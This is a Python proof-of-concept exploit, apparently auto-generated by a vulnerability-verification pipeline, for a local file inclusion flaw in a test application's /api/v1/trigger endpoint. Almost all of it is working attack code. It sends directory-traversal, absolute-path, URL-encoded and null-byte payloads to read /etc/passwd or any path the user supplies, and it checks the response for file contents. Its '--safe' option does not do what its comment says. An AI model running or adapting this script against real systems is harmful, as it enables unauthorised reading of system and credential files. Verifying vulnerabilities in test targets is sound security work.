#!/usr/bin/env python3
# PoC for phase0_test_6ug9osf0 (/tmp/phase0_test_6ug9osf0)
# Path: lfi-000
# Sink: read_custom_file
# Auto-generated — run with: python3 lfi_verifier_pattern_evidence_llm_read_custom_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in phase0_test_6ug9osf0.

Vulnerability: Local File Inclusion (LFI) via read_custom_file sink.
The public API accepts untrusted input that flows into open() without validation.
This PoC demonstrates reading /etc/passwd as a benign proof of file read capability.
"""

import requests
import sys
import argparse

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8080"
ENDPOINT = "/api/v1/trigger"

def exploit_lfi(target_url, payload_path="/etc/passwd"):
    """
    Attempt to exploit LFI by sending a malicious payload to the vulnerable endpoint.
    
    Args:
        target_url: Base URL of the target application
        payload_path: Path to read (default: /etc/passwd for PoC)
    
    Returns:
        Response text if successful, None otherwise
    """
    # Construct full URL
    url = f"{target_url.rstrip('/')}{ENDPOINT}"
    
    # The payload structure depends on how the library processes input.
    # Based on the finding, the entry point accepts untrusted input that flows to read_custom_file.
    # We'll try multiple common patterns for LFI exploitation.
    
    payloads = [
        # Direct path traversal
        {"input": f"../../../../../../..{payload_path}"},
        # Absolute path (bypasses os.path.join truncation)
        {"input": payload_path},
        # URL-encoded variants
        {"input": payload_path.replace("/", "%2F")},
        # Null byte injection (older systems)
        {"input": f"{payload_path}\x00"},
    ]
    
    for i, payload in enumerate(payloads, 1):
        print(f"[*] Attempt {i}: Sending payload: {payload}")
        try:
            # Send POST request with JSON body (common API pattern)
            response = requests.post(
                url,
                json=payload,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"    Status: {response.status_code}")
            print(f"    Response length: {len(response.text)}")
            
            # Check if we got file contents (not an error message)
            if response.status_code == 200 and len(response.text) > 0:
                # Look for signs of successful file read
                if "root:" in response.text or "nobody:" in response.text or "daemon:" in response.text:
                    print(f"[+] SUCCESS! File contents retrieved:")
                    print(response.text[:500])  # Show first 500 chars
                    return response.text
                else:
                    print(f"    Response preview: {response.text[:200]}")
            else:
                print(f"    Response: {response.text[:200]}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error: Could not reach {url}")
            print("    Make sure the target server is running.")
            return None
        except requests.exceptions.Timeout:
            print(f"[-] Timeout: Request to {url} timed out")
            continue
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            continue
    
    print("[-] All attempts failed. The vulnerability may not be exploitable with these payloads.")
    return None

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI vulnerability in phase0_test_6ug9osf0"
    )
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "-p", "--payload",
        default="/etc/passwd",
        help="File path to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--safe",
        action="store_true",
        help="Use a safe payload (touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    print("[*] LFI Exploit PoC for phase0_test_6ug9osf0")
    print(f"[*] Target: {args.target}")
    
    if args.safe:
        # Use a benign payload that creates a file
        payload_path = "/tmp/poc_success.txt"
        print(f"[*] Using safe payload: {payload_path}")
        # Note: For safe mode, we'd need write access, so we'll just read a harmless file
        result = exploit_lfi(args.target, "/etc/hostname")
    else:
        result = exploit_lfi(args.target, args.payload)
    
    if result:
        print("\n[+] Exploit completed successfully!")
        print("[*] The application is vulnerable to LFI.")
        print("[*] Recommendation: Implement path validation and sanitization.")
    else:
        print("\n[-] Exploit did not succeed.")
        print("[*] Possible reasons:")
        print("  - The target is not running or not accessible")
        print("  - The payload format is different from expected")
        print("  - The vulnerability may require different exploitation technique")
        sys.exit(1)

if __name__ == "__main__":
    main()
